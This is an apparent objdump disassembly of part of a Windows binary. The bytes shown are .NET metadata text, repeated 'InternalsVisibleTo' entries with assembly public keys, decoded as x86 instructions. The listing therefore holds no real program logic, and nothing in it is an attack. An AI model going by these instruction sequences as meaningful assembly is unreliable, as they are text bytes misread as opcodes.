  404a9d:	xor    esi,DWORD PTR [esp+esi*1]
  404aa0:	fs xor eax,0x39326461
  404aa6:	xor    eax,DWORD PTR [eax]
  404aa8:	add    BYTE PTR [ecx-0x7efffea2],al
  404aae:	pop    eax
  404aaf:	dec    ecx
  404ab0:	outs   dx,BYTE PTR ds:[esi]
  404ab1:	je     0x404b18
  404ab3:	ins    BYTE PTR es:[edi],dx
  404ab4:	ins    BYTE PTR es:[edi],dx
  404ab5:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x202c6563
  404abd:	push   eax
  404abe:	jne    0x404b22
  404ac0:	ins    BYTE PTR es:[edi],dx
  404ac1:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  404ac8:	xor    BYTE PTR [edx],dh
  404aca:	xor    al,0x30
  404acc:	xor    BYTE PTR [eax],dh
  404ace:	xor    BYTE PTR [eax],dh
  404ad0:	xor    al,0x38
  404ad2:	xor    BYTE PTR [eax],dh
  404ad4:	xor    BYTE PTR [eax],dh
  404ad6:	xor    BYTE PTR [ecx],bh
  404ad8:	xor    al,0x30
  404ada:	xor    BYTE PTR [eax],dh
  404adc:	xor    BYTE PTR [eax],dh
  404ade:	xor    BYTE PTR [eax],dh
  404ae0:	xor    BYTE PTR ss:[edx],dh
  404ae3:	xor    BYTE PTR [eax],dh
  404ae5:	xor    BYTE PTR [eax],dh
  404ae7:	xor    BYTE PTR [eax],dh
  404ae9:	xor    dh,BYTE PTR [eax+esi*1]
  404aec:	xor    BYTE PTR [eax],dh
  404aee:	xor    BYTE PTR ds:0x34333532,dh
  404af4:	xor    DWORD PTR [ebx],esi
  404af6:	xor    DWORD PTR [eax],esi
  404af8:	xor    BYTE PTR [eax],dh
  404afa:	xor    al,0x30
  404afc:	xor    BYTE PTR [eax],dh
  404afe:	xor    BYTE PTR [eax],dh
  404b00:	xor    DWORD PTR [eax],esi
  404b02:	xor    BYTE PTR [eax],dh
  404b04:	xor    DWORD PTR [eax],esi
  404b06:	xor    BYTE PTR [eax],dh
  404b08:	aaa    
  404b09:	xor    DWORD PTR fs:[esi+0x61],esp
  404b0d:	xor    eax,0x61346337
  404b12:	gs cmp DWORD PTR fs:[esi+0x30],esp
  404b17:	popa   
  404b18:	xor    esi,DWORD PTR [edx]
  404b1a:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  404b1e:	popa   
  404b1f:	xor    BYTE PTR [esi+0x61],ah
  404b22:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  404b29:	cmp    BYTE PTR gs:[esi+0x64],ah
  404b2d:	ss popa 
  404b2f:	arpl   WORD PTR gs:[eax],di
  404b32:	data16 cmp BYTE PTR [edi],dh
  404b35:	bound  si,DWORD PTR [eax]
  404b38:	xor    esi,DWORD PTR [edi]
  404b3a:	ss arpl WORD PTR ss:[eax],di
  404b3e:	xor    esi,DWORD PTR [ebx+eiz*2]
  404b41:	cmp    DWORD PTR [ecx],edi
  404b43:	cmp    DWORD PTR [edx],esi
  404b45:	xor    DWORD PTR [ebp+0x62],esp
  404b48:	xor    dh,BYTE PTR [ebx]
  404b4a:	bound  esp,QWORD PTR [ebp+0x37]
  404b4d:	cmp    DWORD PTR [ecx+0x64],esp
  404b50:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  404b54:	arpl   WORD PTR [ebx+0x31],sp
  404b57:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  404b5c:	xor    dh,BYTE PTR [ebx]
  404b5e:	xor    DWORD PTR ss:[ebx],esi
  404b61:	xor    dh,BYTE PTR [ecx]
  404b63:	xor    BYTE PTR [edx],dh
  404b65:	cmp    DWORD PTR [eax],esi
  404b67:	xor    BYTE PTR [edx+0x37],ah
  404b6a:	xor    dh,BYTE PTR [ebx]
  404b6c:	arpl   WORD PTR [esi+0x39],sp
  404b6f:	cmp    BYTE PTR [eax],dh
  404b71:	cmp    DWORD PTR ds:0x34636637,esi
  404b77:	xor    DWORD PTR gs:[edi],esi
  404b7a:	aaa    
  404b7b:	xor    DWORD PTR [eax],esi
  404b7d:	cmp    BYTE PTR [esi+0x63],ah
  404b80:	xor    BYTE PTR ss:[edi],dh
  404b83:	aaa    
  404b84:	aaa    
  404b85:	xor    al,0x66
  404b87:	xor    bh,BYTE PTR [ecx]
  404b89:	cmp    BYTE PTR gs:[ebx],dh
  404b8c:	xor    dh,BYTE PTR [eax]
  404b8e:	cmp    DWORD PTR gs:[edx],esi
  404b91:	gs popa 
  404b93:	xor    BYTE PTR ds:0x34656365,dh
  404b99:	cmp    BYTE PTR gs:[edx],dh
  404b9c:	xor    DWORD PTR [ebx+0x30],esp
  404b9f:	popa   
  404ba0:	xor    eax,0x38656665
  404ba5:	xor    WORD PTR [esi],si
  404ba8:	xor    al,0x35
  404baa:	arpl   WORD PTR [ebx+eiz*2],si
  404bad:	xor    BYTE PTR [ebx+0x39],ah
  404bb0:	xor    esp,DWORD PTR [ebx+0x31]
  404bb3:	popa   
  404bb4:	bound  edi,QWORD PTR [ecx]
  404bb6:	cmp    DWORD PTR [edx],esi
  404bb8:	cmp    BYTE PTR ds:0x32323664,dh
  404bbe:	arpl   WORD PTR [ecx+0x61],sp
  404bc1:	ss xor eax,0x64316332
  404bc7:	popaw  
  404bc9:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  404bcf:	xor    eax,0x32663664
  404bd4:	fs gs xor eax,0x65373166
  404bdb:	xor    eax,0x30666165
  404be0:	data16 arpl WORD PTR [ecx+edi*1],si
  404be4:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  404be9:	xor    DWORD PTR [ebx+0x38],esp
  404bec:	popa   
  404bed:	xor    DWORD PTR [edx],esi
  404bef:	xor    al,0x33
  404bf1:	ss xor eax,0x30323831
  404bf7:	ss arpl WORD PTR fs:[eax],si
  404bfb:	cmp    DWORD PTR [ebx],esi
  404bfd:	xor    esi,DWORD PTR [esp+esi*1]
  404c00:	fs xor eax,0x39326461
  404c06:	xor    eax,DWORD PTR [eax]
  404c08:	add    BYTE PTR [ecx-0x7efffea0],al
  404c0e:	pop    edx
  404c0f:	dec    ecx
  404c10:	outs   dx,BYTE PTR ds:[esi]
  404c11:	je     0x404c78
  404c13:	ins    BYTE PTR es:[edi],dx
  404c14:	ins    BYTE PTR es:[edi],dx
  404c15:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x43536563
  404c1d:	sub    al,0x20
  404c1f:	push   eax
  404c20:	jne    0x404c84
  404c22:	ins    BYTE PTR es:[edi],dx
  404c23:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  404c2a:	xor    BYTE PTR [edx],dh
  404c2c:	xor    al,0x30
  404c2e:	xor    BYTE PTR [eax],dh
  404c30:	xor    BYTE PTR [eax],dh
  404c32:	xor    al,0x38
  404c34:	xor    BYTE PTR [eax],dh
  404c36:	xor    BYTE PTR [eax],dh
  404c38:	xor    BYTE PTR [ecx],bh
  404c3a:	xor    al,0x30
  404c3c:	xor    BYTE PTR [eax],dh
  404c3e:	xor    BYTE PTR [eax],dh
  404c40:	xor    BYTE PTR [eax],dh
  404c42:	xor    BYTE PTR ss:[edx],dh
  404c45:	xor    BYTE PTR [eax],dh
  404c47:	xor    BYTE PTR [eax],dh
  404c49:	xor    BYTE PTR [eax],dh
  404c4b:	xor    dh,BYTE PTR [eax+esi*1]
  404c4e:	xor    BYTE PTR [eax],dh
  404c50:	xor    BYTE PTR ds:0x34333532,dh
  404c56:	xor    DWORD PTR [ebx],esi
  404c58:	xor    DWORD PTR [eax],esi
  404c5a:	xor    BYTE PTR [eax],dh
  404c5c:	xor    al,0x30
  404c5e:	xor    BYTE PTR [eax],dh
  404c60:	xor    BYTE PTR [eax],dh
  404c62:	xor    DWORD PTR [eax],esi
  404c64:	xor    BYTE PTR [eax],dh
  404c66:	xor    DWORD PTR [eax],esi
  404c68:	xor    BYTE PTR [eax],dh
  404c6a:	aaa    
  404c6b:	xor    DWORD PTR fs:[esi+0x61],esp
  404c6f:	xor    eax,0x61346337
  404c74:	gs cmp DWORD PTR fs:[esi+0x30],esp
  404c79:	popa   
  404c7a:	xor    esi,DWORD PTR [edx]
  404c7c:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  404c80:	popa   
  404c81:	xor    BYTE PTR [esi+0x61],ah
  404c84:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  404c8b:	cmp    BYTE PTR gs:[esi+0x64],ah
  404c8f:	ss popa 
  404c91:	arpl   WORD PTR gs:[eax],di
  404c94:	data16 cmp BYTE PTR [edi],dh
  404c97:	bound  si,DWORD PTR [eax]
  404c9a:	xor    esi,DWORD PTR [edi]
  404c9c:	ss arpl WORD PTR ss:[eax],di
  404ca0:	xor    esi,DWORD PTR [ebx+eiz*2]
  404ca3:	cmp    DWORD PTR [ecx],edi
  404ca5:	cmp    DWORD PTR [edx],esi
  404ca7:	xor    DWORD PTR [ebp+0x62],esp
  404caa:	xor    dh,BYTE PTR [ebx]
  404cac:	bound  esp,QWORD PTR [ebp+0x37]
  404caf:	cmp    DWORD PTR [ecx+0x64],esp
  404cb2:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  404cb6:	arpl   WORD PTR [ebx+0x31],sp
  404cb9:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  404cbe:	xor    dh,BYTE PTR [ebx]
  404cc0:	xor    DWORD PTR ss:[ebx],esi
  404cc3:	xor    dh,BYTE PTR [ecx]
  404cc5:	xor    BYTE PTR [edx],dh
  404cc7:	cmp    DWORD PTR [eax],esi
  404cc9:	xor    BYTE PTR [edx+0x37],ah
  404ccc:	xor    dh,BYTE PTR [ebx]
  404cce:	arpl   WORD PTR [esi+0x39],sp
  404cd1:	cmp    BYTE PTR [eax],dh
  404cd3:	cmp    DWORD PTR ds:0x34636637,esi
  404cd9:	xor    DWORD PTR gs:[edi],esi
  404cdc:	aaa    
  404cdd:	xor    DWORD PTR [eax],esi
  404cdf:	cmp    BYTE PTR [esi+0x63],ah
  404ce2:	xor    BYTE PTR ss:[edi],dh
  404ce5:	aaa    
  404ce6:	aaa    
  404ce7:	xor    al,0x66
  404ce9:	xor    bh,BYTE PTR [ecx]
  404ceb:	cmp    BYTE PTR gs:[ebx],dh
  404cee:	xor    dh,BYTE PTR [eax]
  404cf0:	cmp    DWORD PTR gs:[edx],esi
  404cf3:	gs popa 
  404cf5:	xor    BYTE PTR ds:0x34656365,dh
  404cfb:	cmp    BYTE PTR gs:[edx],dh
  404cfe:	xor    DWORD PTR [ebx+0x30],esp
  404d01:	popa   
  404d02:	xor    eax,0x38656665
  404d07:	xor    WORD PTR [esi],si
  404d0a:	xor    al,0x35
  404d0c:	arpl   WORD PTR [ebx+eiz*2],si
  404d0f:	xor    BYTE PTR [ebx+0x39],ah
  404d12:	xor    esp,DWORD PTR [ebx+0x31]
  404d15:	popa   
  404d16:	bound  edi,QWORD PTR [ecx]
  404d18:	cmp    DWORD PTR [edx],esi
  404d1a:	cmp    BYTE PTR ds:0x32323664,dh
  404d20:	arpl   WORD PTR [ecx+0x61],sp
  404d23:	ss xor eax,0x64316332
  404d29:	popaw  
  404d2b:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  404d31:	xor    eax,0x32663664
  404d36:	fs gs xor eax,0x65373166
  404d3d:	xor    eax,0x30666165
  404d42:	data16 arpl WORD PTR [ecx+edi*1],si
  404d46:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  404d4b:	xor    DWORD PTR [ebx+0x38],esp
  404d4e:	popa   
  404d4f:	xor    DWORD PTR [edx],esi
  404d51:	xor    al,0x33
  404d53:	ss xor eax,0x30323831
  404d59:	ss arpl WORD PTR fs:[eax],si
  404d5d:	cmp    DWORD PTR [ebx],esi
  404d5f:	xor    esi,DWORD PTR [esp+esi*1]
  404d62:	fs xor eax,0x39326461
  404d68:	xor    eax,DWORD PTR [eax]
  404d6a:	add    BYTE PTR [ecx-0x7efffe8f],al
  404d70:	imul   ecx,DWORD PTR [ebp+0x69],0x63
  404d74:	jb     0x404de5
  404d76:	jae    0x404de7
  404d78:	data16 je 0x404da9
  404d7b:	dec    ecx
  404d7c:	outs   dx,BYTE PTR ds:[esi]
  404d7d:	je     0x404de4
  404d7f:	ins    BYTE PTR es:[edi],dx
  404d80:	ins    BYTE PTR es:[edi],dx
  404d81:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x432e6563
  404d89:	outs   dx,DWORD PTR ds:[esi]
  404d8a:	outs   dx,BYTE PTR ds:[esi]
  404d8b:	imul   sp,WORD PTR [edi+0x55],0x2c49
  404d91:	and    BYTE PTR [eax+0x75],dl
  404d94:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404d98:	dec    ebx
  404d99:	gs jns 0x404dd9
  404d9c:	xor    BYTE PTR [eax],dh
  404d9e:	xor    dh,BYTE PTR [eax+esi*1]
  404da1:	xor    BYTE PTR [eax],dh
  404da3:	xor    BYTE PTR [eax],dh
  404da5:	xor    al,0x38
  404da7:	xor    BYTE PTR [eax],dh
  404da9:	xor    BYTE PTR [eax],dh
  404dab:	xor    BYTE PTR [ecx],bh
  404dad:	xor    al,0x30
  404daf:	xor    BYTE PTR [eax],dh
  404db1:	xor    BYTE PTR [eax],dh
  404db3:	xor    BYTE PTR [eax],dh
  404db5:	xor    BYTE PTR ss:[edx],dh
  404db8:	xor    BYTE PTR [eax],dh
  404dba:	xor    BYTE PTR [eax],dh
  404dbc:	xor    BYTE PTR [eax],dh
  404dbe:	xor    dh,BYTE PTR [eax+esi*1]
  404dc1:	xor    BYTE PTR [eax],dh
  404dc3:	xor    BYTE PTR ds:0x34333532,dh
  404dc9:	xor    DWORD PTR [ebx],esi
  404dcb:	xor    DWORD PTR [eax],esi
  404dcd:	xor    BYTE PTR [eax],dh
  404dcf:	xor    al,0x30
  404dd1:	xor    BYTE PTR [eax],dh
  404dd3:	xor    BYTE PTR [eax],dh
  404dd5:	xor    DWORD PTR [eax],esi
  404dd7:	xor    BYTE PTR [eax],dh
  404dd9:	xor    DWORD PTR [eax],esi
  404ddb:	xor    BYTE PTR [eax],dh
  404ddd:	aaa    
  404dde:	xor    DWORD PTR fs:[esi+0x61],esp
  404de2:	xor    eax,0x61346337
  404de7:	gs cmp DWORD PTR fs:[esi+0x30],esp
  404dec:	popa   
  404ded:	xor    esi,DWORD PTR [edx]
  404def:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  404df3:	popa   
  404df4:	xor    BYTE PTR [esi+0x61],ah
  404df7:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  404dfe:	cmp    BYTE PTR gs:[esi+0x64],ah
  404e02:	ss popa 
  404e04:	arpl   WORD PTR gs:[eax],di
  404e07:	data16 cmp BYTE PTR [edi],dh
  404e0a:	bound  si,DWORD PTR [eax]
  404e0d:	xor    esi,DWORD PTR [edi]
  404e0f:	ss arpl WORD PTR ss:[eax],di
  404e13:	xor    esi,DWORD PTR [ebx+eiz*2]
  404e16:	cmp    DWORD PTR [ecx],edi
  404e18:	cmp    DWORD PTR [edx],esi
  404e1a:	xor    DWORD PTR [ebp+0x62],esp
  404e1d:	xor    dh,BYTE PTR [ebx]
  404e1f:	bound  esp,QWORD PTR [ebp+0x37]
  404e22:	cmp    DWORD PTR [ecx+0x64],esp
  404e25:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  404e29:	arpl   WORD PTR [ebx+0x31],sp
  404e2c:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  404e31:	xor    dh,BYTE PTR [ebx]
  404e33:	xor    DWORD PTR ss:[ebx],esi
  404e36:	xor    dh,BYTE PTR [ecx]
  404e38:	xor    BYTE PTR [edx],dh
  404e3a:	cmp    DWORD PTR [eax],esi
  404e3c:	xor    BYTE PTR [edx+0x37],ah
  404e3f:	xor    dh,BYTE PTR [ebx]
  404e41:	arpl   WORD PTR [esi+0x39],sp
  404e44:	cmp    BYTE PTR [eax],dh
  404e46:	cmp    DWORD PTR ds:0x34636637,esi
  404e4c:	xor    DWORD PTR gs:[edi],esi
  404e4f:	aaa    
  404e50:	xor    DWORD PTR [eax],esi
  404e52:	cmp    BYTE PTR [esi+0x63],ah
  404e55:	xor    BYTE PTR ss:[edi],dh
  404e58:	aaa    
  404e59:	aaa    
  404e5a:	xor    al,0x66
  404e5c:	xor    bh,BYTE PTR [ecx]
  404e5e:	cmp    BYTE PTR gs:[ebx],dh
  404e61:	xor    dh,BYTE PTR [eax]
  404e63:	cmp    DWORD PTR gs:[edx],esi
  404e66:	gs popa 
  404e68:	xor    BYTE PTR ds:0x34656365,dh
  404e6e:	cmp    BYTE PTR gs:[edx],dh
  404e71:	xor    DWORD PTR [ebx+0x30],esp
  404e74:	popa   
  404e75:	xor    eax,0x38656665
  404e7a:	xor    WORD PTR [esi],si
  404e7d:	xor    al,0x35
  404e7f:	arpl   WORD PTR [ebx+eiz*2],si
  404e82:	xor    BYTE PTR [ebx+0x39],ah
  404e85:	xor    esp,DWORD PTR [ebx+0x31]
  404e88:	popa   
  404e89:	bound  edi,QWORD PTR [ecx]
  404e8b:	cmp    DWORD PTR [edx],esi
  404e8d:	cmp    BYTE PTR ds:0x32323664,dh
  404e93:	arpl   WORD PTR [ecx+0x61],sp
  404e96:	ss xor eax,0x64316332
  404e9c:	popaw  
  404e9e:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  404ea4:	xor    eax,0x32663664
  404ea9:	fs gs xor eax,0x65373166
  404eb0:	xor    eax,0x30666165
  404eb5:	data16 arpl WORD PTR [ecx+edi*1],si
  404eb9:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  404ebe:	xor    DWORD PTR [ebx+0x38],esp
  404ec1:	popa   
  404ec2:	xor    DWORD PTR [edx],esi
  404ec4:	xor    al,0x33
  404ec6:	ss xor eax,0x30323831
  404ecc:	ss arpl WORD PTR fs:[eax],si
  404ed0:	cmp    DWORD PTR [ebx],esi
  404ed2:	xor    esi,DWORD PTR [esp+esi*1]
  404ed5:	fs xor eax,0x39326461
  404edb:	xor    eax,DWORD PTR [eax]
  404edd:	add    BYTE PTR [ecx-0x7efffe89],al
  404ee3:	jno    0x404f32
  404ee5:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404eec:	je     0x404f1c
  404eee:	push   esi
  404eef:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404ef6:	jne    0x404f5c
  404ef8:	imul   ebp,DWORD PTR [edi+0x2e],0x63617254
  404eff:	gs inc ebx
  404f01:	outs   dx,DWORD PTR ds:[esi]
  404f02:	ins    BYTE PTR es:[edi],dx
  404f03:	ins    BYTE PTR es:[edi],dx
  404f04:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  404f09:	sub    al,0x20
  404f0b:	push   eax
  404f0c:	jne    0x404f70
  404f0e:	ins    BYTE PTR es:[edi],dx
  404f0f:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  404f16:	xor    BYTE PTR [edx],dh
  404f18:	xor    al,0x30
  404f1a:	xor    BYTE PTR [eax],dh
  404f1c:	xor    BYTE PTR [eax],dh
  404f1e:	xor    al,0x38
  404f20:	xor    BYTE PTR [eax],dh
  404f22:	xor    BYTE PTR [eax],dh
  404f24:	xor    BYTE PTR [ecx],bh
  404f26:	xor    al,0x30
  404f28:	xor    BYTE PTR [eax],dh
  404f2a:	xor    BYTE PTR [eax],dh
  404f2c:	xor    BYTE PTR [eax],dh
  404f2e:	xor    BYTE PTR ss:[edx],dh
  404f31:	xor    BYTE PTR [eax],dh
  404f33:	xor    BYTE PTR [eax],dh
  404f35:	xor    BYTE PTR [eax],dh
  404f37:	xor    dh,BYTE PTR [eax+esi*1]
  404f3a:	xor    BYTE PTR [eax],dh
  404f3c:	xor    BYTE PTR ds:0x34333532,dh
  404f42:	xor    DWORD PTR [ebx],esi
  404f44:	xor    DWORD PTR [eax],esi
  404f46:	xor    BYTE PTR [eax],dh
  404f48:	xor    al,0x30
  404f4a:	xor    BYTE PTR [eax],dh
  404f4c:	xor    BYTE PTR [eax],dh
  404f4e:	xor    DWORD PTR [eax],esi
  404f50:	xor    BYTE PTR [eax],dh
  404f52:	xor    DWORD PTR [eax],esi
  404f54:	xor    BYTE PTR [eax],dh
  404f56:	aaa    
  404f57:	xor    DWORD PTR fs:[esi+0x61],esp
  404f5b:	xor    eax,0x61346337
  404f60:	gs cmp DWORD PTR fs:[esi+0x30],esp
  404f65:	popa   
  404f66:	xor    esi,DWORD PTR [edx]
  404f68:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  404f6c:	popa   
  404f6d:	xor    BYTE PTR [esi+0x61],ah
  404f70:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  404f77:	cmp    BYTE PTR gs:[esi+0x64],ah
  404f7b:	ss popa 
  404f7d:	arpl   WORD PTR gs:[eax],di
  404f80:	data16 cmp BYTE PTR [edi],dh
  404f83:	bound  si,DWORD PTR [eax]
  404f86:	xor    esi,DWORD PTR [edi]
  404f88:	ss arpl WORD PTR ss:[eax],di
  404f8c:	xor    esi,DWORD PTR [ebx+eiz*2]
  404f8f:	cmp    DWORD PTR [ecx],edi
  404f91:	cmp    DWORD PTR [edx],esi
  404f93:	xor    DWORD PTR [ebp+0x62],esp
  404f96:	xor    dh,BYTE PTR [ebx]
  404f98:	bound  esp,QWORD PTR [ebp+0x37]
  404f9b:	cmp    DWORD PTR [ecx+0x64],esp
  404f9e:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  404fa2:	arpl   WORD PTR [ebx+0x31],sp
  404fa5:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  404faa:	xor    dh,BYTE PTR [ebx]
  404fac:	xor    DWORD PTR ss:[ebx],esi
  404faf:	xor    dh,BYTE PTR [ecx]
  404fb1:	xor    BYTE PTR [edx],dh
  404fb3:	cmp    DWORD PTR [eax],esi
  404fb5:	xor    BYTE PTR [edx+0x37],ah
  404fb8:	xor    dh,BYTE PTR [ebx]
  404fba:	arpl   WORD PTR [esi+0x39],sp
  404fbd:	cmp    BYTE PTR [eax],dh
  404fbf:	cmp    DWORD PTR ds:0x34636637,esi
  404fc5:	xor    DWORD PTR gs:[edi],esi
  404fc8:	aaa    
  404fc9:	xor    DWORD PTR [eax],esi
  404fcb:	cmp    BYTE PTR [esi+0x63],ah
  404fce:	xor    BYTE PTR ss:[edi],dh
  404fd1:	aaa    
  404fd2:	aaa    
  404fd3:	xor    al,0x66
  404fd5:	xor    bh,BYTE PTR [ecx]
  404fd7:	cmp    BYTE PTR gs:[ebx],dh
  404fda:	xor    dh,BYTE PTR [eax]
  404fdc:	cmp    DWORD PTR gs:[edx],esi
  404fdf:	gs popa 
  404fe1:	xor    BYTE PTR ds:0x34656365,dh
  404fe7:	cmp    BYTE PTR gs:[edx],dh
  404fea:	xor    DWORD PTR [ebx+0x30],esp
  404fed:	popa   
  404fee:	xor    eax,0x38656665
  404ff3:	xor    WORD PTR [esi],si
  404ff6:	xor    al,0x35
  404ff8:	arpl   WORD PTR [ebx+eiz*2],si
  404ffb:	xor    BYTE PTR [ebx+0x39],ah
  404ffe:	xor    esp,DWORD PTR [ebx+0x31]
  405001:	popa   
  405002:	bound  edi,QWORD PTR [ecx]
  405004:	cmp    DWORD PTR [edx],esi
  405006:	cmp    BYTE PTR ds:0x32323664,dh
  40500c:	arpl   WORD PTR [ecx+0x61],sp
  40500f:	ss xor eax,0x64316332
  405015:	popaw  
  405017:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  40501d:	xor    eax,0x32663664
  405022:	fs gs xor eax,0x65373166
  405029:	xor    eax,0x30666165
  40502e:	data16 arpl WORD PTR [ecx+edi*1],si
  405032:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405037:	xor    DWORD PTR [ebx+0x38],esp
  40503a:	popa   
  40503b:	xor    DWORD PTR [edx],esi
  40503d:	xor    al,0x33
  40503f:	ss xor eax,0x30323831
  405045:	ss arpl WORD PTR fs:[eax],si
  405049:	cmp    DWORD PTR [ebx],esi
  40504b:	xor    esi,DWORD PTR [esp+esi*1]
  40504e:	fs xor eax,0x39326461
  405054:	xor    eax,DWORD PTR [eax]
  405056:	add    BYTE PTR [ecx-0x7efffe88],al
  40505c:	jb     0x4050ab
  40505e:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405065:	je     0x405095
  405067:	push   esi
  405068:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40506f:	jne    0x4050d5
  405071:	imul   ebp,DWORD PTR [edi+0x2e],0x63617254
  405078:	gs dec esp
  40507a:	outs   dx,DWORD PTR ds:[esi]
  40507b:	addr16 push eax
  40507d:	popa   
  40507e:	arpl   WORD PTR [ebx+0x61],bp
  405081:	addr16 gs sub al,0x20
  405085:	push   eax
  405086:	jne    0x4050ea
  405088:	ins    BYTE PTR es:[edi],dx
  405089:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  405090:	xor    BYTE PTR [edx],dh
  405092:	xor    al,0x30
  405094:	xor    BYTE PTR [eax],dh
  405096:	xor    BYTE PTR [eax],dh
  405098:	xor    al,0x38
  40509a:	xor    BYTE PTR [eax],dh
  40509c:	xor    BYTE PTR [eax],dh
  40509e:	xor    BYTE PTR [ecx],bh
  4050a0:	xor    al,0x30
  4050a2:	xor    BYTE PTR [eax],dh
  4050a4:	xor    BYTE PTR [eax],dh
  4050a6:	xor    BYTE PTR [eax],dh
  4050a8:	xor    BYTE PTR ss:[edx],dh
  4050ab:	xor    BYTE PTR [eax],dh
  4050ad:	xor    BYTE PTR [eax],dh
  4050af:	xor    BYTE PTR [eax],dh
  4050b1:	xor    dh,BYTE PTR [eax+esi*1]
  4050b4:	xor    BYTE PTR [eax],dh
  4050b6:	xor    BYTE PTR ds:0x34333532,dh
  4050bc:	xor    DWORD PTR [ebx],esi
  4050be:	xor    DWORD PTR [eax],esi
  4050c0:	xor    BYTE PTR [eax],dh
  4050c2:	xor    al,0x30
  4050c4:	xor    BYTE PTR [eax],dh
  4050c6:	xor    BYTE PTR [eax],dh
  4050c8:	xor    DWORD PTR [eax],esi
  4050ca:	xor    BYTE PTR [eax],dh
  4050cc:	xor    DWORD PTR [eax],esi
  4050ce:	xor    BYTE PTR [eax],dh
  4050d0:	aaa    
  4050d1:	xor    DWORD PTR fs:[esi+0x61],esp
  4050d5:	xor    eax,0x61346337
  4050da:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4050df:	popa   
  4050e0:	xor    esi,DWORD PTR [edx]
  4050e2:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4050e6:	popa   
  4050e7:	xor    BYTE PTR [esi+0x61],ah
  4050ea:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4050f1:	cmp    BYTE PTR gs:[esi+0x64],ah
  4050f5:	ss popa 
  4050f7:	arpl   WORD PTR gs:[eax],di
  4050fa:	data16 cmp BYTE PTR [edi],dh
  4050fd:	bound  si,DWORD PTR [eax]
  405100:	xor    esi,DWORD PTR [edi]
  405102:	ss arpl WORD PTR ss:[eax],di
  405106:	xor    esi,DWORD PTR [ebx+eiz*2]
  405109:	cmp    DWORD PTR [ecx],edi
  40510b:	cmp    DWORD PTR [edx],esi
  40510d:	xor    DWORD PTR [ebp+0x62],esp
  405110:	xor    dh,BYTE PTR [ebx]
  405112:	bound  esp,QWORD PTR [ebp+0x37]
  405115:	cmp    DWORD PTR [ecx+0x64],esp
  405118:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  40511c:	arpl   WORD PTR [ebx+0x31],sp
  40511f:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  405124:	xor    dh,BYTE PTR [ebx]
  405126:	xor    DWORD PTR ss:[ebx],esi
  405129:	xor    dh,BYTE PTR [ecx]
  40512b:	xor    BYTE PTR [edx],dh
  40512d:	cmp    DWORD PTR [eax],esi
  40512f:	xor    BYTE PTR [edx+0x37],ah
  405132:	xor    dh,BYTE PTR [ebx]
  405134:	arpl   WORD PTR [esi+0x39],sp
  405137:	cmp    BYTE PTR [eax],dh
  405139:	cmp    DWORD PTR ds:0x34636637,esi
  40513f:	xor    DWORD PTR gs:[edi],esi
  405142:	aaa    
  405143:	xor    DWORD PTR [eax],esi
  405145:	cmp    BYTE PTR [esi+0x63],ah
  405148:	xor    BYTE PTR ss:[edi],dh
  40514b:	aaa    
  40514c:	aaa    
  40514d:	xor    al,0x66
  40514f:	xor    bh,BYTE PTR [ecx]
  405151:	cmp    BYTE PTR gs:[ebx],dh
  405154:	xor    dh,BYTE PTR [eax]
  405156:	cmp    DWORD PTR gs:[edx],esi
  405159:	gs popa 
  40515b:	xor    BYTE PTR ds:0x34656365,dh
  405161:	cmp    BYTE PTR gs:[edx],dh
  405164:	xor    DWORD PTR [ebx+0x30],esp
  405167:	popa   
  405168:	xor    eax,0x38656665
  40516d:	xor    WORD PTR [esi],si
  405170:	xor    al,0x35
  405172:	arpl   WORD PTR [ebx+eiz*2],si
  405175:	xor    BYTE PTR [ebx+0x39],ah
  405178:	xor    esp,DWORD PTR [ebx+0x31]
  40517b:	popa   
  40517c:	bound  edi,QWORD PTR [ecx]
  40517e:	cmp    DWORD PTR [edx],esi
  405180:	cmp    BYTE PTR ds:0x32323664,dh
  405186:	arpl   WORD PTR [ecx+0x61],sp
  405189:	ss xor eax,0x64316332
  40518f:	popaw  
  405191:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405197:	xor    eax,0x32663664
  40519c:	fs gs xor eax,0x65373166
  4051a3:	xor    eax,0x30666165
  4051a8:	data16 arpl WORD PTR [ecx+edi*1],si
  4051ac:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
